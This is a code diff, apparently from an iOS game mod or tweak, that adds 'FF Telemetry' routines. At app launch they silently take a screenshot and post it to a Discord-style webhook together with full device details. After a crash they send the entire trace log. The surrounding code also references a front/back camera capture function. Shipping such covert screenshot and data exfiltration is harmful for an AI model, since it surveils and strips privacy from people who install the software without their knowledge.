@@ -387,6 +387,67 @@ static void FfTelCameraShot(BOOL front)
         }
     });
 }
+static NSString *FfTelLogText(void)
+{
+    if (!aikTracePath[0]) return nil;
+    NSString *p = [NSString stringWithUTF8String:aikTracePath];
+    if (!p) return nil;
+    return [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
+}
+
+// If the previous session died inside an il2cpp call, the trace log's last
+// line is a "pre <step>" with no "post". Report it once, then rotate the log.
+static void FfTelCrashCheck(void)
+{
+    NSString *txt = FfTelLogText();
+    if (txt.length == 0) return;
+
+    NSArray<NSString *> *lines = [txt componentsSeparatedByString:@"\n"];
+    NSString *last = @"";
+    for (NSInteger i = (NSInteger)lines.count - 1; i >= 0; i--)
+    {
+        if (lines[i].length) { last = lines[i]; break; }
+    }
+    if (![last hasPrefix:@"pre "]) return;
+
+    NSString *step = last;
+    NSRange sp = [last rangeOfString:@" st="];
+    if (sp.location != NSNotFound) step = [last substringToIndex:sp.location];
+
+    NSMutableArray *tail = [NSMutableArray array];
+    NSInteger start = MAX(0, (NSInteger)lines.count - 40);
+    for (NSInteger i = start; i < (NSInteger)lines.count; i++)
+        if (lines[i].length) [tail addObject:lines[i]];
+    NSString *tailText = [tail componentsJoinedByString:@"\n"];
+    if (tailText.length > 1800) tailText = [tailText substringFromIndex:tailText.length - 1800];
+
+    NSString *desc = [NSString stringWithFormat:
+        @"**Crash detected** - last call: `%@`\n```\n%@\n```", step, tailText];
+
+    NSString *payload = [NSString stringWithFormat:
+        @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"CRASH\",\"color\":15158332,\"description\":\"%@\",\"footer\":{\"text\":\"%@\"}}]}",
+        FfTelEscape(desc), FfTelEscape(FfTelDeviceFull())];
+
+    NSData *logData = [txt dataUsingEncoding:NSUTF8StringEncoding];
+    FfTelPost(payload, logData.length ? @[@{@"name": @"ff_aik.log", @"type": @"text/plain", @"data": logData}] : @[]);
+
+    [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithUTF8String:aikTracePath] error:nil];
+}
+
+static void FfTelLaunchShot(void)
+{
+    NSData *jpg = FfTelShot();
+    if (jpg.length)
+    {
+        NSString *payload = [NSString stringWithFormat:
+            @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Launch\",\"color\":3447003,\"description\":\"%@\",\"image\":{\"url\":\"attachment://shot.jpg\"}}]}",
+            FfTelEscape(FfTelDeviceFull())];
+        FfTelPost(payload, @[@{@"name": @"shot.jpg", @"type": @"image/jpeg", @"data": jpg}]);
+        return;
+    }
+    FfTelSendText([NSString stringWithFormat:@"Launch (no screenshot)\n%@", FfTelDeviceFull()]);
+}
+
 // Call once per frame from the render loop (main thread).
 static void FfTelTick(BOOL menuOpen)
 {
